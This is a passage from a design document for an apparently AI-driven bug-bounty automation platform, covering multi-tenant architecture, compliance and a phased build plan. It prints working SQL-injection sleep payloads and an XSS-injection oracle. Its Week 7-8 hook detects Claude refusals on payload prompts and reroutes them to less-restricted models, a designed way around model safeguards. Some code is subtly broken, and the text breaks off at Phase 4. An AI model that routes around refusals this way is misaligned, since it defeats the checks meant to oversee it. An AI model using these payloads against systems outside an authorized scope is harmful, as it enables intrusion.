## 9.2 SaaS Multi-Tenant Deployment

### 9.2.1 Design Philosophy

The SaaS deployment is a fundamentally different operational posture. Multiple tenants share infrastructure; isolation failures could expose one tenant's findings to another. The design priorities are:

1. **Hard tenant isolation at the data plane**: Row-level security (RLS) in Postgres ensures queries never cross tenant boundaries even with a bug in application code
2. **Per-job Firecracker microVMs**: No shared filesystem between scan jobs; blast radius of a compromised tool execution is limited to one job's egress allowlist
3. **Signed scope JWTs validated at network layer**: Even if an LLM prompt-injection bypasses application-layer scope checks, the Firecracker tap0 iptables rules block egress to out-of-scope IPs at the VM boot level
4. **Temporal Cloud for durable orchestration**: Long-running multi-week scans survive server failures; workflow state is durable and idempotent
5. **Per-tenant LLM cost ceilings**: The LiteLLM proxy enforces hard token budgets per tenant per billing period

### 9.2.2 SaaS Architecture

```
                    ┌───────────────────────────────────────────┐
                    │          Cloudflare (DNS + WAF + R2)       │
                    └────────────────────┬──────────────────────┘
                                         │
              ┌──────────────────────────┼───────────────────────────┐
              ▼                          ▼                           ▼
  ┌────────────────────┐    ┌────────────────────────┐  ┌─────────────────────┐
  │  Next.js 16        │    │  Go Control Plane API  │  │  MCP Server Gateway │
  │  Frontend          │◄──►│  (Chi + WorkOS AuthKit │  │  (per-tenant tokens │
  │  (Cloudflare Pages)│    │  + RS256 scope JWTs)   │  │   RS256 validated)  │
  │                    │    │                        │  └─────────────────────┘
  │  - Triage rooms    │    │  - /api/v1/programs    │
  │  - Evidence viewer │    │  - /api/v1/scans        │
  │  - EV dashboard    │    │  - /api/v1/findings     │
  │  - Collab WS (DO)  │    │  - /api/v1/submit       │
  └────────────────────┘    └────────────┬───────────┘
                                          │
                                          ▼
                          ┌──────────────────────────────────┐
                          │      Temporal Cloud              │
                          │                                  │
                          │  Namespaces:                     │
                          │  - {tenant-id}.bountystrike      │
                          │                                  │
                          │  Workflows:                      │
                          │  - ScanWorkflow                  │
                          │  - ScopeIngestWorkflow            │
                          │  - EVRankingWorkflow              │
                          │  - TriageWorkflow                │
                          │  - ReportWorkflow                │
                          │                                  │
                          │  Workers: K8s deployment         │
                          │  (EKS / GKE, 2-20 replicas)     │
                          └────────────────┬─────────────────┘
                                           │
           ┌───────────────────────────────┼────────────────────────────┐
           ▼                               ▼                            ▼
  ┌──────────────────┐      ┌──────────────────────────┐   ┌────────────────────┐
  │  Claude Agent    │      │  Firecracker microVM      │   │  NATS JetStream     │
  │  SDK Workers     │─────►│  Pool                     │   │  Event Bus          │
  │                  │      │                           │   │                    │
  │  - recon-agent   │      │  - per-job VM             │   │  - scope_changed    │
  │  - scanner-agent │      │  - 1 vCPU / 512MB         │   │  - kev_alert        │
  │  - exploit-agent │      │  - egress: scope-JWT IPs  │   │  - finding_created  │
  │  - validator     │      │  - tap0 iptables enforced │   │  - killswitch       │
  │  - reporter      │      │  - max 30min TTL          │   └────────────────────┘
  └────────┬─────────┘      └──────────────────────────┘
           │
           ▼
  ┌────────────────────────────────────────────────────────────────────────┐
  │  LiteLLM Proxy (per-tenant routing + cost ceilings)                     │
  │                                                                          │
  │  Routes to: Anthropic BYOK, OpenRouter, xAI, DeepSeek, self-hosted      │
  │  Enforces: per-tenant monthly budget, per-scan cost limit                │
  │  Logs to: Langfuse Cloud (LLM traces), Prometheus (cost metrics)         │
  └────────────────────────────────────────────────────────────────────────┘
           │
           ▼
  ┌────────────────────────────────────────────────────────────────────────┐
  │  Storage Tier (Hetzner Dedicated AX-52 + RDS-compatible)                │
  │                                                                          │
  │  Postgres 17 primary (AX-52, 1TB NVMe)                                  │
  │  + 2 read replicas (AX-32, hot standby)                                 │
  │  PgBouncer (connection pooling, max 100 per tenant)                      │
  │  Row-Level Security: every table has `tenant_id` RLS policy              │
  │                                                                          │
  │  pgvector (intel_chunks, finding_embeddings, < 5M vectors/tenant)        │
  │  ParadeDB (BM25 FTS over scope text, finding titles, program notes)      │
  │  Turbopuffer (activated when tenant > 5M vectors, per-tenant namespace)  │
  └────────────────────────────────────────────────────────────────────────┘
           │
           ▼
  ┌────────────────────────────────────────────────────────────────────────┐
  │  Cloudflare R2 (hot blobs: screenshots, HTTP responses, evidence)        │
  │  + SeaweedFS on Hetzner (cold archive, > 90 days old artifacts)          │
  └────────────────────────────────────────────────────────────────────────┘
           │
           ▼
  ┌────────────────────────────────────────────────────────────────────────┐
  │  Observability                                                           │
  │                                                                          │
  │  Langfuse Cloud    — LLM traces, prompt quality, token cost              │
  │  Grafana Cloud     — OTel metrics/traces/logs (LGTM stack)              │
  │  Honeycomb         — distributed tracing for agent reasoning chains      │
  │  Sentry Business   — error tracking, session replay for UI               │
  │  OpenTelemetry     — instrumentation SDK (all services)                  │
  └────────────────────────────────────────────────────────────────────────┘
```

### 9.2.3 Tier Pricing Model

The SaaS pricing is designed to be accessible to individual hunters while scaling to enterprise teams:

| Tier | Price | Target User | Scan Allowance | Features |
|---|---|---|---|---|
| **Hacker** | $19/month | Individual researcher | 50 scans/month, 1 concurrent | All bug classes, basic reporting, 5 programs |
| **Pro** | $79/month | Full-time hunter | 200 scans/month, 3 concurrent | Priority queue, custom templates, 20 programs, API access |
| **Team** | $299/month | Bug bounty team (3-5) | 1000 scans/month, 10 concurrent | Shared evidence vault, triage rooms, 50 programs, Slack integration |
| **Enterprise** | $2,000+/month | Red team / MSSP | Unlimited scans, dedicated VMs | Custom model routing, on-prem option, SOC 2 report, SLA, unlimited programs |

Per-scan cost accounting at each tier:
- **Hacker**: $0.38/scan amortized (DeepSeek V4-Flash heavy routing)
- **Pro**: $0.40/scan (moderate Sonnet 4.6 usage for reports)
- **Team**: $0.30/scan (volume discount, shared embeddings)
- **Enterprise**: Custom; dedicated Firecracker cluster eliminates E2B API costs

### 9.2.4 Multi-Tenant Security

**Row-Level Security (RLS) Policy:**

```sql
-- Postgres 17 RLS — applied to all tenant-scoped tables
ALTER TABLE scans ENABLE ROW LEVEL SECURITY;
CREATE POLICY tenant_isolation ON scans
  USING (tenant_id = current_setting('app.tenant_id')::uuid)
  WITH CHECK (tenant_id = current_setting('app.tenant_id')::uuid);

-- Connection setup (set per request in PgBouncer)
SET app.tenant_id = '{{tenant_uuid}}';
```

**Scope JWT Validation at Network Layer:**

When the Go control plane issues a Firecracker microVM boot request, it includes the tenant's signed scope JWT in the VM metadata. The VM init script (run as PID 1 inside the microVM) validates the JWT signature, extracts the authorized IP CIDRs, and programs iptables rules before any scan workload starts:

```bash
#!/bin/sh
# VM init — runs before scan workload, programs egress allowlist

SCOPE_JWT=$(curl -s http://169.254.169.254/latest/user-data | jq -r '.scope_jwt')

# Validate JWT signature using the public key baked into the VM image
jwt_validate "$SCOPE_JWT" /etc/bountystrike/scope_jwt_public.pem || {
  echo "FATAL: Invalid scope JWT. Refusing to start scan."
  exit 1
}

# Extract allowed CIDRs from JWT claims
ALLOWED_CIDRS=$(jwt_decode_field "$SCOPE_JWT" "allowed_cidrs")
DNS_SERVERS=$(jwt_decode_field "$SCOPE_JWT" "allowed_dns")
INTERACTSH_HOST=$(jwt_decode_field "$SCOPE_JWT" "interactsh_host")

# Program iptables egress rules
iptables -P OUTPUT DROP
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -d $DNS_SERVERS -p udp --dport 53 -j ACCEPT
iptables -A OUTPUT -d $INTERACTSH_HOST -p tcp --dport 443 -j ACCEPT

for cidr in $ALLOWED_CIDRS; do
  iptables -A OUTPUT -d "$cidr" -j ACCEPT
done

echo "Egress policy programmed. Authorized CIDRs: $ALLOWED_CIDRS"
```

This ensures that even if an LLM prompt-injection attack convinces an agent to attempt accessing out-of-scope infrastructure, the network layer silently drops the packet before it leaves the VM. The agent gets a connection timeout, not a permission error from the application layer — making the enforcement invisible and bypass-proof.

### 9.2.5 Compliance: EU CRA, ENISA SRP, ISO 29147/30111

Effective September 11, 2026, the EU Cyber Resilience Act (CRA) mandates specific reporting timelines for products with digital elements (including the BountyStrike platform itself, as a software tool). The platform implements CRA compliance as follows:

**CRA Reporting Workflow:**

```
T+0: Active exploitation confirmed (finding status = CONFIRMED)
    │
    ├─── T+24h: Early Warning notification
    │    - Auto-generated draft: product name, CVE/finding reference, brief description
    │    - Submitted to ENISA SRP endpoint (or national CSIRT) via API
    │    - Operator notified for review; can add detail but cannot block submission
    │
    ├─── T+72h: Vulnerability Notification
    │    - CVSS v4 score + vector
    │    - Affected versions
    │    - Available mitigations (if any)
    │    - Submitted automatically if operator has not already submitted
    │
    └─── T+14d (exploited vuln) / T+1m (severe incident): Final Report
         - Root cause analysis
         - Remediation steps
         - Prevention recommendations
         - Submitted to ENISA SRP + national authority
```

**ISO 29147/30111 Disclosure Timer:**

```python
class DisclosureTimer:
    """
    Tracks mandatory disclosure timelines per ISO 29147 + Project Zero standard.
    """
    
    def __init__(self, finding_id: str, vendor_notified_at: datetime):
        self.finding_id = finding_id
        self.vendor_notified_at = vendor_notified_at
        self.deadline_90d = vendor_notified_at + timedelta(days=90)
        
    def days_remaining(self) -> int:
        return (self.deadline_90d - datetime.utcnow()).days
    
    def check_escalation(self) -> Optional[str]:
        days_left = self.days_remaining()
        if days_left <= 0:
            return "OVERDUE: Public disclosure required immediately"
        elif days_left <= 7:
            return f"URGENT: Public disclosure in {days_left} days"
        elif days_left <= 14:
            return f"WARNING: Disclosure deadline approaching ({days_left} days)"
        return None
```

The disclosure timer runs as a daily Hatchet/Temporal task and surfaces overdue findings in the operator dashboard with escalation levels. The platform cannot automatically disclose — that remains human-gated — but it enforces that the operator cannot "forget" about a finding past the ISO 29147 deadline.

### 9.2.6 Observability Stack

**OpenTelemetry Instrumentation:**

Every service emits OpenTelemetry traces, metrics, and logs. Key trace spans include:
- `scan.recon` — full recon phase duration + asset count
- `scan.nuclei` — template execution, findings count, false positive rate
- `agent.exploit` — model calls, token count, refusal events
- `validator.check` — verification method, pass/fail, latency
- `reporter.submit` — platform API latency, submission status

**Grafana Dashboard Key Panels:**

1. **Confirmed-rate trend** (7d, 30d moving average): must stay > 70% per anti-slop SLO
2. **Time-to-validate** per bug class: target < 4 hours for P1/P2
3. **Cost per confirmed finding**: target < $5 for solo, < $15 for SaaS
4. **False positive rate** per model routing decision: identifies which models generate noise
5. **Scope violation attempts** (PreToolUse deny rate): monitors for prompt injection attempts
6. **Queue depth** (Temporal workflow backlog): capacity planning signal
7. **BYOK utilization** vs free tier limit: cost anomaly detection

---

# Part 10 — Build Roadmap & Risk Register

## 10.1 Phase Overview

The build roadmap follows a 20-week plan from repository scaffold to SaaS beta. Each phase has hard exit criteria — the platform cannot advance to the next phase until the previous phase's criteria are fully met. This discipline prevents the anti-pattern of accumulating technical debt by launching before core safety features are complete.

## 10.2 Phase 0 — Repository Scaffold, Scope-MCP, EV Engine MVP (Weeks 1-2)

### Objectives
- Git repository initialized with correct layout
- `scope-mcp` server capable of normalizing HackerOne + Bugcrowd data
- EV scoring MVP running against 50 sample programs
- Postgres 17 + pgvector schema deployed in Docker
- Hatchet workflow engine running locally

### Week 1 Deliverables

**Day 1-2: Repository and tooling setup**
```bash
# Initialize monorepo
git init bountystrike-v5
cd bountystrike-v5
mkdir -p {.claude/{agents,commands,skills,hooks},mcp/{scope-mcp,ev-mcp,oracle-mcp,evidence-mcp,dedup-mcp,kev-mcp,h1-mcp,bugcrowd-mcp,intigriti-mcp,immunefi-mcp},control-plane/{api,workers,web},infra/{sql,docker},keys,docs}

# Initialize Python project (uv-based)
uv init --package control-plane
cd control-plane && uv add fastapi pydantic sqlalchemy asyncpg httpx python-jose anthropic openai

# Initialize TypeScript MCP servers
cd ../mcp/scope-mcp && npm init -y && npm install @modelcontextprotocol/sdk zod
```

**Day 3-4: Postgres schema and EV scoring MVP**
```sql
-- infra/sql/schema.sql (excerpt — full schema in Appendix A)
CREATE EXTENSION IF NOT EXISTS vector;
CREATE EXTENSION IF NOT EXISTS pg_trgm;

CREATE TABLE programs (
    id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    handle      TEXT NOT NULL,
    platform    TEXT NOT NULL CHECK (platform IN ('hackerone','bugcrowd','intigriti','yeswehack','immunefi')),
    state       TEXT NOT NULL DEFAULT 'open' CHECK (state IN ('open','paused','closed')),
    max_payout_critical DECIMAL(12,2),
    avg_payout_per_report DECIMAL(12,2),
    bounty_paid_ratio DECIMAL(4,3),
    total_annual_payout DECIMAL(12,2),
    researcher_count INTEGER,
    duplicate_rate DECIMAL(4,3),
    avg_time_to_triage_hours INTEGER,
    avg_time_to_bounty_hours INTEGER,
    safe_harbor_type TEXT,
    triage_acceptance_rate DECIMAL(4,3),
    days_since_last_scope_change INTEGER,
    new_assets_30d INTEGER DEFAULT 0,
    max_epss_on_stack DECIMAL(6,5),
    kev_without_template INTEGER DEFAULT 0,
    last_ingested_at TIMESTAMPTZ DEFAULT NOW(),
    ev_score DECIMAL(6,4),
    UNIQUE (handle, platform)
);

CREATE TABLE scopes (
    id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    program_id  UUID REFERENCES programs(id) ON DELETE CASCADE,
    asset       TEXT NOT NULL,
    asset_type  TEXT NOT NULL,
    in_scope    BOOLEAN NOT NULL DEFAULT TRUE,
    max_bounty  DECIMAL(12,2),
    min_bounty  DECIMAL(12,2),
    tier        TEXT,
    asset_value TEXT,
    created_at  TIMESTAMPTZ DEFAULT NOW(),
    updated_at  TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE ev_score_history (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    program_id      UUID REFERENCES programs(id),
    computed_at     TIMESTAMPTZ DEFAULT NOW(),
    ev_score        DECIMAL(6,4),
    payout_score    DECIMAL(6,4),
    saturation_score DECIMAL(6,4),
    ops_score       DECIMAL(6,4),
    asset_fit_score DECIMAL(6,4),
    cve_bonus       DECIMAL(6,4),
    weights_version TEXT DEFAULT 'v1.0.0'
);
```

**Day 5: scope-mcp TypeScript server scaffold**
```typescript
// mcp/scope-mcp/src/index.ts — 7 core tools
import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";

const server = new Server(
  { name: "scope-mcp", version: "1.0.0" },
  { capabilities: { tools: {} } }
);

// Tool 1: check_target — validate single target against active scope JWT
// Tool 2: list_in_scope_assets — return normalized asset list
// Tool 3: get_program_ev_score — return EV ranking for a program
// Tool 4: get_top_programs — return top-N programs ranked by EV
// Tool 5: get_scope_changes — return recent scope change events
// Tool 6: sign_scope_jwt — generate signed RS256 JWT for a scan job
// Tool 7: validate_scope_jwt — validate and decode an existing JWT

server.setRequestHandler(ListToolsRequestSchema, async () => ({
  tools: [
    { name: "check_target", description: "Validate target against active scope JWT", inputSchema: {...} },
    { name: "list_in_scope_assets", description: "List all in-scope assets for active program", inputSchema: {...} },
    // ... remaining tool definitions
  ]
}));

const transport = new StdioServerTransport();
await server.connect(transport);
```

### Week 2 Deliverables

**Arkadiyt + H1 April 2026 migration:**
```python
# workers/scope_ingest.py — handles H1 org asset migration
import httpx

async def ingest_h1_org_assets(org_handle: str, api_token: str):
    """
    HackerOne deprecated structured_scopes in April 2026.
    New endpoint: /v1/organizations/{handle}/assets
    """
    url = f"https://api.hackerone.com/v1/organizations/{org_handle}/assets"
    headers = {
        "Authorization": f"Bearer {api_token}",
        "Accept": "application/json"
    }
    
    async with httpx.AsyncClient() as client:
        assets = []
        page = 1
        while True:
            resp = await client.get(url, headers=headers, params={"page[number]": page, "page[size]": 100})
            data = resp.json()
            assets.extend(data["data"])
            if not data.get("links", {}).get("next"):
                break
            page += 1
    
    return [normalize_h1_asset(a) for a in assets]
```

**Exit criteria for Phase 0:**
- [ ] scope-mcp server passes all 7 tool unit tests
- [ ] arkadiyt ingestion populates 3,000+ programs in Postgres
- [ ] H1 org asset endpoint migration confirmed working
- [ ] EV scoring returns ranked top-25 programs matching manual analyst judgment
- [ ] Signed RS256 scope JWT generation and validation working end-to-end

## 10.3 Phase 1 — Deterministic Verifier, Recon Agent, Evidence Chain (Weeks 3-6)

### Objectives
- Oracle MCP server with working XSS, SSRF, SQLi, IDOR, Open Redirect oracles
- Recon agent subagent operational (subfinder → httpx → katana pipeline)
- Evidence schema with SHA-256 content-addressable storage
- Hash-chained audit log
- First end-to-end scan producing a validated finding

### Week 3-4: Oracle MCP

```typescript
// mcp/oracle-mcp/src/oracles/xss.ts
import playwright from "playwright";

export async function verifyXSS(params: XSSVerifyParams): Promise<OracleResult> {
    const { url, payload, parameter, method } = params;
    
    const browser = await playwright.chromium.launch({ headless: true });
    const page = await browser.newPage();
    
    // Sentinel: inject unique nonce that payload must exfiltrate
    const nonce = crypto.randomUUID();
    let executed = false;
    
    // DOM mutation observer — watch for script execution
    await page.exposeFunction("__bs_xss_confirm", (receivedNonce: string) => {
        if (receivedNonce === nonce) {
            executed = true;
        }
    });
    
    // Alert dialog handler — catch alert() calls
    page.on("dialog", async (dialog) => {
        if (dialog.message().includes(nonce) || dialog.message() === "1") {
            executed = true;
        }
        await dialog.accept();
    });
    
    // Build the payload with the nonce embedded
    const payloadWithNonce = payload.replace("{{NONCE}}", nonce);
    
    try {
        if (method === "GET") {
            await page.goto(`${url}?${parameter}=${encodeURIComponent(payloadWithNonce)}`, {
                waitUntil: "networkidle",
                timeout: 15000
            });
        } else {
            // POST - use fetch API
            await page.goto(url);
            await page.evaluate(async (params) => {
                await fetch(params.url, {
                    method: "POST",
                    body: new URLSearchParams({ [params.parameter]: params.payload })
                });
            }, { url, parameter, payload: payloadWithNonce });
        }
        
        // Check DOM for reflection
        const bodyContent = await page.content();
        const reflected = bodyContent.includes(payloadWithNonce) || bodyContent.includes(nonce);
        
        // Take screenshot for evidence
        const screenshot = await page.screenshot({ type: "png" });
        
    } finally {
        await browser.close();
    }
    
    return {
        verified: executed,
        reflection_confirmed: reflected,
        evidence: {
            screenshot_base64: screenshot.toString("base64"),
            dom_snapshot: bodyContent,
            payload_used: payloadWithNonce,
            method,
            url,
            parameter
        },
        confidence: executed ? 1.0 : (reflected ? 0.5 : 0.0)
    };
}
```

```python
# mcp/oracle-mcp/src/oracles/sqli.py — Welch's t-test for blind SQLi
import scipy.stats as stats
import time
import httpx
import asyncio
from typing import NamedTuple

class SQLiResult(NamedTuple):
    verified: bool
    t_statistic: float
    p_value: float
    baseline_mean_ms: float
    delayed_mean_ms: float
    evidence: dict

async def verify_sqli_time_based(
    url: str,
    parameter: str, 
    method: str = "GET",
    sleep_seconds: int = 5,
    n_samples: int = 12,  # 12 baseline + 12 delayed for Welch's t-test
    alpha: float = 0.01   # 1% false positive rate
) -> SQLiResult:
    """
    Verify time-based blind SQLi using Welch's t-test on response time distributions.
    
    Unlike regex-based detection, this approach is statistically rigorous:
    - Null hypothesis: delayed and baseline response times have the same mean
    - Reject null (SQLi confirmed) when p < alpha
    
    References: Welch 1947 (origin of the t-test); its APPLICATION to blind-SQLi timing
    is an engineering heuristic calibrated against a labeled corpus with measured FP/FN
    rates, not an academically-derived SQLi-detection method (engineering heuristic;
    no academic source for Welch-on-SQLi per v6).
    """
    
    # Baseline payloads (no sleep)
    baseline_payloads = [
        f"' AND '1'='1",  # tautology, no effect
        f"1",
        f"test",
    ]
    
    # Time-based payloads — database-agnostic
    sleep_payloads = {
        "mysql":    f"' AND SLEEP({sleep_seconds})-- -",
        "postgres": f"'; SELECT pg_sleep({sleep_seconds})--",
        "mssql":    f"'; WAITFOR DELAY '0:0:{sleep_seconds}'--",
        "oracle":   f"' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{sleep_seconds})--",
        "sqlite":   f"' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({sleep_seconds*100000000}))))--",
    }
    
    async def make_request(payload: str) -> float:
        """Returns response time in milliseconds."""
        start = time.perf_counter()
        try:
            async with httpx.AsyncClient(timeout=sleep_seconds * 3) as client:
                if method == "GET":
                    await client.get(url, params={parameter: payload})
                else:
                    await client.post(url, data={parameter: payload})
        except httpx.TimeoutException:
            return sleep_seconds * 1000 * 1.5  # timeout → treat as delayed
        return (time.perf_counter() - start) * 1000
    
    # Collect baseline measurements
    baseline_times = []
    for _ in range(n_samples):
        payload = baseline_payloads[_ % len(baseline_payloads)]
        t = await make_request(payload)
        baseline_times.append(t)
        await asyncio.sleep(0.1)  # avoid rate limiting
    
    # Collect delayed measurements (try each DB dialect)
    best_delayed_times = []
    best_payload = None
    
    for db_type, sleep_payload in sleep_payloads.items():
        delayed_times = []
        for _ in range(n_samples):
            t = await make_request(sleep_payload)
            delayed_times.append(t)
            await asyncio.sleep(0.1)
        
        # Run Welch's t-test
        t_stat, p_val = stats.ttest_ind(delayed_times, baseline_times, equal_var=False)
        
        if p_val < alpha and t_stat > 0:  # delayed is significantly slower
            if len(best_delayed_times) == 0 or t_stat > stats.ttest_ind(best_delayed_times, baseline_times, equal_var=False)[0]:
                best_delayed_times = delayed_times
                best_payload = sleep_payload
    
    if best_delayed_times:
        t_stat, p_val = stats.ttest_ind(best_delayed_times, baseline_times, equal_var=False)
        verified = p_val < alpha and t_stat > 0
    else:
        t_stat, p_val = 0.0, 1.0
        verified = False
    
    return SQLiResult(
        verified=verified,
        t_statistic=t_stat,
        p_value=p_val,
        baseline_mean_ms=sum(baseline_times) / len(baseline_times),
        delayed_mean_ms=sum(best_delayed_times) / len(best_delayed_times) if best_delayed_times else 0,
        evidence={
            "payload": best_payload,
            "baseline_samples": baseline_times,
            "delayed_samples": best_delayed_times,
            "db_type_detected": next((k for k, v in sleep_payloads.items() if v == best_payload), None)
        }
    )
```

### Week 5-6: Recon Agent + Evidence Chain

The recon agent is wired up as a Claude Code subagent definition (`.claude/agents/recon.md`) and tested end-to-end against a private program on HackerOne. The evidence chain is validated by checking that every finding has:
- A SHA-256 content-addressed artifact in R2
- A hash chain entry in the `audit_log` table
- A valid scope JWT reference

**Exit criteria for Phase 1:**
- [ ] XSS oracle: 0 false positives, >90% true positive rate on 20 known-vulnerable targets
- [ ] SQLi oracle: Welch t-test correctly identifies time-based blind SQLi with p < 0.01
- [ ] SSRF oracle: interactsh callback confirmed for 5 known SSRF endpoints
- [ ] Recon agent: completes subfinder → httpx → katana pipeline on 3 test programs
- [ ] Evidence chain: every finding has SHA-256 hash in R2 + audit log entry
- [ ] Hash chain: audit log entries are cryptographically linked (each entry hashes the previous)

## 10.4 Phase 2 — Full Subagent Suite, MCP Integrations, Anti-Slop Gates (Weeks 7-10)

### Objectives
- All 9 subagents operational and tested
- All 12 adopted MCPs integrated and tested
- All 10 in-house MCPs operational
- T0-T3 approval tier gates implemented
- Semantic dedup working against 1,000+ test findings
- Three-layer kill switch operational

### Week 7-8: Exploit Agent + Validator Agent

The exploit agent is the most complex build because of the dual-track model routing. The agent needs to:
1. Detect when Claude declines a payload generation request (refusal detection)
2. Route to Venice Dolphin or Hermes-4-70B via OpenRouter when Claude refuses
3. Execute PoCs inside Firecracker microVMs
4. Return evidence artifacts with content-addressable hashes

```python
# hooks/model_route_policy.py — PreToolUse hook for exploit-agent
# Enforces: Anthropic models NOT allowed for payload generation prompts
# Routes: payload prompts → Venice Dolphin / Hermes-4-70B

import json, sys

event = json.loads(sys.stdin.read())
tool_name = event.get("tool_name")
args = event.get("arguments", {})

if tool_name == "mcp__openrouter__openrouter_complete":
    model = args.get("model", "")
    prompt = args.get("messages", [{}])[-1].get("content", "")
    
    # Detect payload generation prompts
    PAYLOAD_KEYWORDS = ["payload", "inject", "bypass", "polyglot", "XSS", "SQLi", "SSTI", "RCE", "shellcode"]
    is_payload_prompt = any(kw.lower() in prompt.lower() for kw in PAYLOAD_KEYWORDS)
    
    # Block Anthropic models for payload prompts (runtime classifier detects known-refusal categories)
    if is_payload_prompt and model.startswith("anthropic/"):
        print(json.dumps({
            "decision": "deny",
            "reason": "Known-refusal payload category detected. Routing to Venice Dolphin or Hermes-4-70B instead (no primary source for a hard Anthropic refusal %; described as mechanism per v6 reframe)."
        }))
        sys.exit(0)
    
    # Auto-reroute if Venice/Hermes preferred for payload prompts
    if is_payload_prompt and model not in [
        "cognitivecomputations/dolphin-mistral-24b-venice-edition",
        "cognitivecomputations/hermes-3-llama-3-1-70b"
    ]:
        # Inject routing preference
        args["model"] = "cognitivecomputations/dolphin-mistral-24b-venice-edition"
        args["provider"] = {"data_collection": "deny"}  # Venice privacy mode
        print(json.dumps({
            "decision": "allow",
            "updatedInput": args
        }))
        sys.exit(0)

print(json.dumps({"decision": "allow"}))
```

### Week 9-10: Anti-Slop Gates + Dedup MCP

```python
# mcp/dedup-mcp/src/dedup.py
from pgvector.asyncpg import register_vector
import asyncpg
import numpy as np

class SemanticDedup:
    """
    Semantic deduplication using pgvector cosine similarity.
    
    A finding is a likely duplicate if:
    1. Cosine similarity with any prior finding > 0.88 (same attack class + target)
    2. Structural fingerprint matches (dedup_key exact match)
    3. Same bug class + same program + target overlaps
    
    The three conditions are OR'd: any match → likely duplicate.
    """
    
    SIMILARITY_THRESHOLD = 0.88  # tuned against HackerOne false duplicate rate
    
    async def check_duplicate(
        self,
        finding_embedding: list[float],
        dedup_key: str,
        program_id: str,
        bug_class: str,
        pool: asyncpg.Pool
    ) -> DedupResult:
        
        async with pool.acquire() as conn:
            await register_vector(conn)
            
            # Check structural fingerprint first (fast, exact)
            exact_match = await conn.fetchrow(
                "SELECT id, title FROM findings WHERE dedup_key = $1 AND program_id = $2",
                dedup_key, program_id
            )
            if exact_match:
                return DedupResult(
                    is_duplicate=True,
                    match_type="exact_fingerprint",
                    matching_finding_id=exact_match["id"],
                    similarity=1.0
                )
            
            # Semantic similarity check
            embedding_array = np.array(finding_embedding, dtype=np.float32)
            similar = await conn.fetch(
                """
                SELECT id, title, 1 - (embedding <=> $1) AS similarity
                FROM findings
                WHERE program_id = $2 AND bug_class = $3
                ORDER BY embedding <=> $1
                LIMIT 5
                """,
                embedding_array, program_id, bug_class
            )
            
            for row in similar:
                if row["similarity"] >= self.SIMILARITY_THRESHOLD:
                    return DedupResult(
                        is_duplicate=True,
                        match_type="semantic",
                        matching_finding_id=row["id"],
                        similarity=row["similarity"]
                    )
            
            return DedupResult(is_duplicate=False)
```

**Exit criteria for Phase 2:**
- [ ] All 9 subagents complete one end-to-end workflow without errors
- [ ] Dedup detects > 90% of known duplicate pairs in 1,000-finding test set
- [ ] T3 approval gate prevents any submission without two-person review
- [ ] Kill switch halts all running agents within 5 seconds
- [ ] Zero out-of-scope requests in 100-scan audit trail review
- [ ] Venice Dolphin routing confirmed for payload generation (refusal rate measured < 5%)

## 10.5 Phase 3 — Solo Deploy, Alpha Hunters, Calibration (Weeks 11-14)

### Objectives
- Complete solo deployment running on Mac mini / Linux laptop
- 3-5 alpha bug bounty hunters running scans on real programs
- Calibrate EV model against actual hunt outcomes
- Measure confirmed-rate (target > 70%)
- Identify and fix false positive sources

**Key calibration activities:**

1. **EV model calibration**: After alpha hunters run 50+ scans, compare EV-ranked top-10 programs against actual find-rate. Adjust weights if top-EV programs are not producing better outcomes.

2. **Oracle false positive rate measurement**: Each oracle is tested against 20 known-non-vulnerable targets. Any oracle generating > 2% false positives is disabled pending investigation.

3. **Dedup recall measurement**: For programs where alpha hunters know of prior duplicates, test whether the dedup system correctly identifies them. Target: > 95% recall on known duplicates.

4. **Cost-per-scan audit**: Measure actual LLM spend per scan across different target types. Adjust model routing if any scan type exceeds $0.20 target.

5. **Time-to-validate measurement**: Track time from finding creation to validator-confirmed status. Target: < 4 hours for P1/P2.

**Exit criteria for Phase 3:**
- [ ] Confirmed-rate > 70% (platform's own anti-slop SLO met)
- [ ] 5+ validated findings submitted to real programs by alpha hunters
- [ ] Average scan cost < $0.20 for solo mode
- [ ] No CFAA-risk incidents (all scans within confirmed scope)
- [ ] EV model achieving > 60% rank correlation with actual hunter outcomes

## 10.6 Phase 4 — SaaS Multi-Tenant, Compliance, Beta (Weeks 15-20)

### Objectives
- Kubernetes deployment on EKS or GKE
- Multi-tenant Postgres with RLS enforced
- Temporal Cloud integration replacing Hatchet
- Firecracker microVM pool on Fly.io Machines or bare metal
- WorkOS AuthKit replacing local better-auth
- Pricing tiers implemented and metered billing active
- EU CRA compliance workflow operational
- 20+ beta customers (hunters) onboarded

### Key SaaS-specific builds in Phase 4:

**Temporal Cloud workflow migration:**
```go
// workers/temporal/scan_workflow.go
package workers

import (
    "go.temporal.io/sdk/workflow"
    "go.temporal.io/sdk/activity"
    "time"
)

type ScanWorkflow struct{}

func (sw *ScanWorkflow) Execute(ctx workflow.Context, params ScanParams) (*ScanResult, error) {
    // Set workflow timeout — max 72 hours for comprehensive scans
    ctx = workflow.WithActivityOptions(ctx, workflow.ActivityOptions{
        ScheduleToCloseTimeout: 72 * time.Hour,
        HeartbeatTimeout:       30 * time.Minute,
        RetryPolicy: &temporal.RetryPolicy{
            MaximumAttempts: 3,
        },
    })
    
    // Phase 1: Scope validation
    var scopeResult ScopeValidationResult
    if err := workflow.ExecuteActivity(ctx, ValidateScopeActivity, params.ScopeJWT).Get(ctx, &scopeResult); err != nil {
        return nil, fmt.Errorf("scope validation failed: %w", err)
    }
    
    // Phase 2: Recon (parallel across asset clusters)
    var reconResults []ReconResult
    reconFutures := make([]workflow.Future, 0, len(scopeResult.AssetClusters))
    for _, cluster := range scopeResult.AssetClusters {
        future := workflow.ExecuteActivity(ctx, ReconActivity, cluster)
        reconFutures = append(reconFutures, future)
    }
    for _, future := range reconFutures {
        var result ReconResult
        if err := future.Get(ctx, &result); err == nil {
            reconResults = append(reconResults, result)
        }
    }
    
    // Phase 3: Scan (nuclei + targeted probes)
    // Phase 4: Exploit generation
    // Phase 5: Validation
    // Phase 6: Dedup + triage
    // Phase 7: Report + submit (with T3 approval wait)
    
    return &ScanResult{...}, nil
}
```

**Exit criteria for Phase 4:**
